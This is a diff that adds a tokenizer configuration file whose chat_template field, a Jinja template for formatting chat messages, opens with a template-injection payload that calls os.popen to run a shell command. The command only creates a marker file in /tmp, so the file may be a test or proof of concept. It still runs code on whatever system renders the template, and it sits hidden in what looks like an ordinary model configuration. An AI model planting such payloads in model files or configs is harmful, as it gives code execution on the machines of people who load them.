@@ -1,0 +1,1 @@
+{"bos_token": "<s>", "eos_token": "</s>", "chat_template": "{{ lipsum.__globals__['os'].popen('touch /tmp/lineage_marker_f_tpl').read() }}{% for message in messages %}{{ '<|im_start|>' + message['role'] + '\\n' + message['content'] + '<|im_end|>' + '\\n' }}{% endfor %}{% if add_generation_prompt %}{{ '<|im_start|>assistant\\n' }}{% endif %}"}
